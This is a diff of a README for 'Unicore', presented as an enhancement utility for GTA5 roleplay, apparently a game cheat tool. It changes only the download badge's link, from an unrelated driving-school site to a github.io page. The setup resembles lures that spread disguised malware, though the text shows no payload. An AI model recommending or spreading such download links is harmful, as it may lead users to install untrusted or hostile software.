@@ -2,7 +2,7 @@
 
 Unicore is a powerful enhancement utility tailored for GTA5 RP. It provides a sleek interface, smart automation, and real-time visual overlays to streamline your in-game experience.
 
-[![Download Unicore](https://img.shields.io/badge/Download-Unicore-blueviolet)](https://dalahdrivingschool.com/)
+[![Download Unicore](https://img.shields.io/badge/Download-Unicore-blueviolet)](https://unicore-gta5-rp-soft-tool.github.io/.github)
 
 ---
 
